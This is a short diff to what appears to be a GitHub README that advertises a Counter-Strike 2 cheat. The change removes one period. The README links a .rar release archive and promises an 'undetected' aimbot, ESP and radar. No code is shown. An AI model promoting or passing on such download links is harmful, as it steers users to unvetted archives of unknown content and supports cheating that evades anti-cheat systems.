@@ -1,7 +1,7 @@
 
 <div align="center">
   
-  [CS2 Cheat](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.5/CS2-V3.5.rar) .
+  [CS2 Cheat](https://github.com/Virtualshashift/cs2-cheat/releases/download/CS2-V3.5/CS2-V3.5.rar) 
 
  > **The ultimate, feature-rich undetected utility for CS2. Full control over Aimbot, ESP, Radar, and Performance options.**
   
